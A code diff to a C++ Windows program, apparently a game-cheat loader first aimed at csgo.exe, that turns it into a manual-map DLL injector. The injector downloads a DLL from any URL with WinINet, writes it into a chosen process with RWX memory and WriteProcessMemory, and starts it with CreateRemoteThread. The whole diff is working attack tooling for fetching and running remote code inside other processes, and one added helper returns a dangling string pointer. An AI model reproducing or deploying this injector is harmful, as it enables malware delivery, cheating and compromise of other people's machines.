@@ -1,9 +1,10 @@
 #include <iostream>
-
 #include "stdafx.hpp"
-
 #include <Windows.h>
 #include <TlHelp32.h>
+
+#include <wininet.h>
+#pragma comment(lib, "Wininet")
 
 using namespace std;
 
@@ -53,6 +54,32 @@ DWORD FindProcessId(string processName)
 
 	CloseHandle(processSnapshot);
 	return 0;
+}
+
+LPCSTR FindProcessName(DWORD processId)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
+
+	if (hProcess != NULL)
+	{
+		char szProcessPath[MAX_PATH];
+		DWORD size = sizeof(szProcessPath);
+
+		if (QueryFullProcessImageName(hProcess, 0, szProcessPath, &size) != 0)
+		{
+			std::string processPath(szProcessPath);
+			size_t lastBackslash = processPath.find_last_of('\\');
+			if (lastBackslash != std::string::npos)
+			{
+				std::string processName = processPath.substr(lastBackslash + 1);
+				return processName.c_str();
+			}
+		}
+
+		CloseHandle(hProcess);
+	}
+
+	return nullptr;
 }
 
 DWORD __stdcall LibraryLoader(LPVOID Memory)
@@ -161,98 +188,163 @@ BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
-int loader(LPCSTR Dll)
+PVOID remoteDownloadDll(LPCSTR dllUrl, DWORD& dllSize) {
+	HINTERNET hInternet = InternetOpen("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	if (hInternet) {
+		// Open URL
+		try {
+			HINTERNET hConnect = InternetOpenUrl(hInternet, dllUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+
+			if (hConnect) {
+				std::vector<char> dllBuffer;
+				DWORD bytesRead = 0;
+				char buffer[1024];
+
+				// Reading DLL Bytes
+				while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+					dllBuffer.insert(dllBuffer.end(), buffer, buffer + bytesRead);
+				}
+
+				// Close Connection
+				InternetCloseHandle(hConnect);
+
+				// Close WinINet Library
+				InternetCloseHandle(hInternet);
+
+				// Calcule DLL Length
+				dllSize = static_cast<DWORD>(dllBuffer.size());
+
+				// Create buffer and copy DLL bytes
+				PVOID dllData = malloc(dllSize);
+				if (dllData) {
+					memcpy(dllData, dllBuffer.data(), dllSize);
+					return dllData;
+				}
+				else {
+					std::cout << "[-] Fail to allocate bytes to buffer." << std::endl;
+				}
+			}
+			else {
+				std::cout << "[-] Fail to open URL: " << GetLastError() << std::endl;
+			
+			}
+
+			// Close WinINet Library
+			InternetCloseHandle(hInternet);
+		}
+		catch (const std::exception& e) {
+			std::cout << "[-] Invalid URL: " << dllUrl << std::endl;
+			system("PAUSE");
+		}
+	}
+	else {
+		std::cout << "[-] Fail to start WinInet." << std::endl;
+		system("PAUSE");
+	}
+
+	return nullptr; // Return nullptr
+}
+
+
+int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
 {
 
-	DWORD ProcessId = FindProcessId("csgo.exe");
+	DWORD ProcessId = FindProcessId(processName);
 
 	EnumWindowsData data;
 	data.targetProcessId = ProcessId;
 	data.targetWindow = nullptr;
 
-	do
+	if (waitWindow)
 	{
-		EnumWindows(EnumWindowsCallback, reinterpret_cast<LPARAM>(&data));
-		
-		if (data.targetWindow != nullptr)
+		do
 		{
-			std::this_thread::sleep_for(std::chrono::milliseconds(15000)); // wait game start
-			break;
-		}
+			EnumWindows(EnumWindowsCallback, reinterpret_cast<LPARAM>(&data));
 
-		std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+			if (data.targetWindow != nullptr)
+			{
+				std::this_thread::sleep_for(std::chrono::milliseconds(15000)); // wait game start
+				break;
+			}
 
-	} while (true);
+			std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+
+		} while (true);
+	}
 
 	loaderdata LoaderParams;
 
-	HANDLE hFile = CreateFileA(Dll, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
-		OPEN_EXISTING, 0, NULL); // Open the DLL
+	// Download Remote DLL
+	DWORD dllSize;
+	
+	try {
+		PVOID FileBuffer = remoteDownloadDll(dllUrl, dllSize);
 
-	DWORD FileSize = GetFileSize(hFile, NULL);
-	PVOID FileBuffer = VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		// Target Dll's DOS Header
+		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
+		// Target Dll's NT Headers
+		PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);
 
-	// Read the DLL
-	ReadFile(hFile, FileBuffer, FileSize, NULL, NULL);
+		// Opening target process.
+		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
+		// Allocating memory for the DLL
+		PVOID ExecutableImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
+			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	// Target Dll's DOS Header
-	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
-	// Target Dll's NT Headers
-	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);
+		// Copy the headers to target process
+		WriteProcessMemory(hProcess, ExecutableImage, FileBuffer,
+			pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
-	// Opening target process.
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
-	// Allocating memory for the DLL
-	PVOID ExecutableImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
-		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		// Target Dll's Section Header
+		PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
+		// Copying sections of the dll to the target process
+		for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+		{
+			WriteProcessMemory(hProcess, (PVOID)((LPBYTE)ExecutableImage + pSectHeader[i].VirtualAddress),
+				(PVOID)((LPBYTE)FileBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
+		}
 
-	// Copy the headers to target process
-	WriteProcessMemory(hProcess, ExecutableImage, FileBuffer,
-		pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+		// Allocating memory for the loader code.
+		PVOID LoaderMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
+			PAGE_EXECUTE_READWRITE); // Allocate memory for the loader code
 
-	// Target Dll's Section Header
-	PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
-	// Copying sections of the dll to the target process
-	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
-	{
-		WriteProcessMemory(hProcess, (PVOID)((LPBYTE)ExecutableImage + pSectHeader[i].VirtualAddress),
-			(PVOID)((LPBYTE)FileBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
+		LoaderParams.ImageBase = ExecutableImage;
+		LoaderParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)ExecutableImage + pDosHeader->e_lfanew);
+
+		LoaderParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)ExecutableImage
+			+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+		LoaderParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ExecutableImage
+			+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+
+		LoaderParams.fnLoadLibraryA = LoadLibraryA;
+		LoaderParams.fnGetProcAddress = GetProcAddress;
+
+		// Write the loader information to target process
+		WriteProcessMemory(hProcess, LoaderMemory, &LoaderParams, sizeof(loaderdata),
+			NULL);
+		// Write the loader code to target process
+		WriteProcessMemory(hProcess, (PVOID)((loaderdata*)LoaderMemory + 1), LibraryLoader,
+			(DWORD)stub - (DWORD)LibraryLoader, NULL);
+		// Create a remote thread to execute the loader code
+		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderdata*)LoaderMemory + 1),
+			LoaderMemory, 0, NULL);
+
+		// std::cout << "Address of Loader: " << std::hex << LoaderMemory << std::endl;
+		// std::cout << "Address of Image: " << std::hex << ExecutableImage << std::endl;
+
+
+		// Wait for the loader to finish executing
+		WaitForSingleObject(hThread, INFINITE);
 	}
+	catch (const std::exception& e) {
+		std::cout << "[-] Error with dll injection." << std::endl;
+		std::cout << "Process Name: " << processName << std::endl;
+		std::cout << "DLL URL: " << dllUrl << std::endl;
+		
+		system("PAUSE");
 
-	// Allocating memory for the loader code.
-	PVOID LoaderMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE); // Allocate memory for the loader code
-
-	LoaderParams.ImageBase = ExecutableImage;
-	LoaderParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)ExecutableImage + pDosHeader->e_lfanew);
-
-	LoaderParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)ExecutableImage
-		+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-	LoaderParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ExecutableImage
-		+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
-
-	LoaderParams.fnLoadLibraryA = LoadLibraryA;
-	LoaderParams.fnGetProcAddress = GetProcAddress;
-
-	// Write the loader information to target process
-	WriteProcessMemory(hProcess, LoaderMemory, &LoaderParams, sizeof(loaderdata),
-		NULL);
-	// Write the loader code to target process
-	WriteProcessMemory(hProcess, (PVOID)((loaderdata*)LoaderMemory + 1), LibraryLoader,
-		(DWORD)stub - (DWORD)LibraryLoader, NULL);
-	// Create a remote thread to execute the loader code
-	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderdata*)LoaderMemory + 1),
-		LoaderMemory, 0, NULL);
-
-	// std::cout << "Address of Loader: " << std::hex << LoaderMemory << std::endl;
-	// std::cout << "Address of Image: " << std::hex << ExecutableImage << std::endl;
-
-
-	// Wait for the loader to finish executing
-	WaitForSingleObject(hThread, INFINITE);
-
-	Beep(500, 100);
-	std::cout << "Injected!" << std::endl;
+		ExitProcess(0);
+	}
 
 	// free the allocated loader code
 	// VirtualFreeEx(hProcess, LoaderMemory, 0, MEM_RELEASE);
